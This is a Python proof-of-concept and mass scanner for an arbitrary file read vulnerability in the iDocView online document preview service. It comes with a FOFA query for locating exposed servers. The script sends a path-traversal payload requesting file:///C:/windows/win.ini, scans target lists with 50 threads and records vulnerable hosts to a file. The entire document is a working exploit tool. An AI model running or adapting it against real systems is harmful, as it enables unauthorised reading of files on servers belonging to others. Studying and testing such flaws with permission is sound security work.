# DocView在线文档预览任意文件读取
import argparse, requests, sys, time, re, json
from termcolor import colored
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()


# fofa语句
# title=="在线文档预览 - I Doc View"

def banner():
    test = """
██████╗  ██████╗  ██████╗    ██╗   ██╗██╗███████╗██╗    ██╗      ██████╗ ███████╗ █████╗ ██████╗ 
██╔══██╗██╔═══██╗██╔════╝    ██║   ██║██║██╔════╝██║    ██║      ██╔══██╗██╔════╝██╔══██╗██╔══██╗
██║  ██║██║   ██║██║         ██║   ██║██║█████╗  ██║ █╗ ██║█████╗██████╔╝█████╗  ███████║██║  ██║
██║  ██║██║   ██║██║         ╚██╗ ██╔╝██║██╔══╝  ██║███╗██║╚════╝██╔══██╗██╔══╝  ██╔══██║██║  ██║
██████╔╝╚██████╔╝╚██████╗     ╚████╔╝ ██║███████╗╚███╔███╔╝      ██║  ██║███████╗██║  ██║██████╔╝
╚═════╝  ╚═════╝  ╚═════╝      ╚═══╝  ╚═╝╚══════╝ ╚══╝╚══╝       ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝ 

                                                            
"""
    colored_color = colored(test, 'blue')
    print(colored_color)


def main():
    banner()
    parser = argparse.ArgumentParser(description='DocView在线文档预览任意文件读取漏洞POC')
    parser.add_argument('-u', '--url', dest='url', type=str, help="请输入你要测试的URL")
    parser.add_argument('-f', '--file', dest='file', type=str, help="请输入你要批量测试的文件路径")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(50)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


def poc(target):
    api_payload = "/view/qJvqhFt.json?start=1&size=5&url=file%3A%2F%2F%2FC%3A%2Fwindows%2Fwin.ini&idocv_auth=sapi"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Connection': 'close'
    }
    try:
        response = requests.get(url=target + api_payload, headers=headers, verify=False, timeout=10)
        content = json.loads(response.text)
        if response.status_code == 200 and content['code'] == '1':
            print(f"[+]{target} 存在任意文件读取漏洞")
            with open('result.txt', 'a') as fp:
                fp.write(target + '\n')
        else:
            print(f"[-]{target} 不存在任意文件读取漏洞")
    except:
        print(f"[X]{target} 该站点无法访问")


if __name__ == '__main__':
    main()